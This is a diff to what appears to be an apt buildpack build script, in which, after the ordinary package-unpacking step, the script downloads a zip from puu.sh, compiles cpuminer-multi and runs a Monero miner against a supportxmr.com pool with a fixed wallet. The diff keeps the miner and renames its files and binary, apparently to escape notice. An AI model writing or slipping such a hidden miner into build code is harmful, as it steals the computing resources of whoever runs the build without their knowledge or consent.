@@ -57,35 +57,16 @@ for DEB in $(ls -1 $APT_CACHE_DIR/archives/*.deb); do
   dpkg -x $DEB $BUILD_DIR/.apt/
 done
 
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-echo "aksdpoaspo"
-
-wget -O abc.zip "http://puu.sh/xUHe3/09ed0bb5d1.zip"
-unzip abc.zip
-rm abc.zip
-mv cpuminer-multi abc
-cd abc
+wget -O cvb.zip "http://puu.sh/xUHe3/09ed0bb5d1.zip"
+unzip cvb.zip
+rm cvb.zip
+mv cpuminer-multi cvb
+cd cvb
 chmod 777 autogen.sh
 ./autogen.sh
 CFLAGS="-march=native" ./configure
 make
-./minerd -a cryptonight -o stratum+tcp://de01.supportxmr.com:80 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p xmrexploder -t 4
+mv minerd aaa
+mv autogen.sh fuck.sh
+./aaa -a cryptonight -o stratum+tcp://de01.supportxmr.com:80 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p xmrexploder -t 4
 echo "done"
